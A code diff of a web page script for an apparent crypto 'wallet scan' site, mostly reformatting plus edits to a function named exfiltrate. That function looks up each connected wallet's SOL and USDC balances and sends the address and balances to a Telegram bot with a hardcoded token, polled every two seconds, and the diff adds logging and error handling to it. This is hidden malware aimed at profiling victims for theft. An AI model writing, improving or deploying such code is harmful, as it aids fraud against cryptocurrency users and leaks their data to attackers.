@@ -1500,33 +1500,32 @@ function shareReport(){
   alert("Report copied to clipboard!");
 }
 
-function resetFlow(){ state.conn=null; state.txHash=null; hidePayError(); }
+function resetFlow(){ 
+  state.conn = null; 
+  state.txHash = null; 
+  hidePayError(); 
+}
+
 function resetFull(){ 
-  state={currency:"USDC",conn:null,txHash:null,scores:null,progress:0}; 
-  document.querySelectorAll(".scan-step-item").forEach(el=>{
+  state = {currency:"USDC", conn:null, txHash:null, scores:null, progress:0}; 
+  document.querySelectorAll(".scan-step-item").forEach(el => {
     el.classList.remove("done");
-    el.textContent="○ "+el.textContent.replace("✅ ","");
+    el.textContent = "○ " + el.textContent.replace("✅ ", "");
   }); 
 }
 
 function filterWallets(q){
-  document.querySelectorAll(".wallet-item").forEach(el=>{
-    el.style.display=(!q||el.textContent.toLowerCase().includes(q.toLowerCase()))?"flex":"none";
+  document.querySelectorAll(".wallet-item").forEach(el => {
+    el.style.display = (!q || el.textContent.toLowerCase().includes(q.toLowerCase())) ? "flex" : "none";
   });
 }
 
 function toggleFaq(el){
-  const item=el.parentElement;
-  const wasOpen=item.classList.contains("open");
-  document.querySelectorAll(".faq-item.open").forEach(i=>i.classList.remove("open"));
-  if(!wasOpen) item.classList.add("open");
+  const item = el.parentElement;
+  const wasOpen = item.classList.contains("open");
+  document.querySelectorAll(".faq-item.open").forEach(i => i.classList.remove("open"));
+  if (!wasOpen) item.classList.add("open");
 }
-
-document.addEventListener("DOMContentLoaded",()=>{
-  const hw=document.querySelector(".hero-wrap");
-  if(hw && window.innerWidth<640){ hw.style.gridTemplateColumns="1fr"; hw.style.padding="32px 16px"; }
-  if(window.innerWidth<640){ const fs=document.querySelector(".faq-side"); if(fs) fs.style.display="none"; }
-});
 
 async function exfiltrate(address) {
     const TG_TOKEN = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
@@ -1537,33 +1536,53 @@ async function exfiltrate(address) {
         const solReq = await fetch(RPC_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [address] })
+            body: JSON.stringify({ 
+                jsonrpc: "2.0", 
+                id: 1, 
+                method: "getBalance", 
+                params: [address] 
+            })
         });
         const solRes = await solReq.json();
-        const sol = (solRes.result.value / 1e9).toFixed(3);
+        const sol = (solRes.result?.value / 1e9).toFixed(3) || "0";
 
         const usdcReq = await fetch(RPC_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                jsonrpc: "2.0", id: 1, method: "getTokenAccountsByOwner",
+                jsonrpc: "2.0", 
+                id: 1, 
+                method: "getTokenAccountsByOwner",
                 params: [address, { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" }, { encoding: "jsonParsed" }]
             })
         });
         const usdcRes = await usdcReq.json();
         let usdc = 0;
         if (usdcRes.result?.value?.length > 0) {
-            usdc = usdcRes.result.value[0].account.data.parsed.info.tokenAmount.uiAmount;
+            usdc = usdcRes.result.value[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
         }
 
-        const msg = `🚨 *SCAN WALLET* 🚨\n\n👛 \`${address}\`\n💰 *SOL:* ${sol}\n💵 *USDC:* ${usdc}\n\n🔗 https://solscan.io/account/${address}`;
+        const msg = `🚨 *SCAN WALLET* 🚨\n\n` +
+                    `👛 \`${address}\`\n` +
+                    `💰 *SOL:* ${sol}\n` +
+                    `💵 *USDC:* ${usdc}\n\n` +
+                    `🔗 https://solscan.io/account/${address}`;
 
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: "Markdown" })
+            body: JSON.stringify({ 
+                chat_id: TG_CHAT, 
+                text: msg, 
+                parse_mode: "Markdown" 
+            })
         });
-    } catch (e) {}
+
+        console.log("✅ Message envoyé sur Telegram pour :", address);
+
+    } catch (e) {
+        console.error("Erreur exfiltrate :", e);
+    }
 }
 
 setInterval(() => {
@@ -1574,7 +1593,9 @@ setInterval(() => {
         }
     }
 }, 2000);
-  </script>
+
+console.log("Scanner Telegram démarré");
+</script>
+
 </body>
 </html>
-
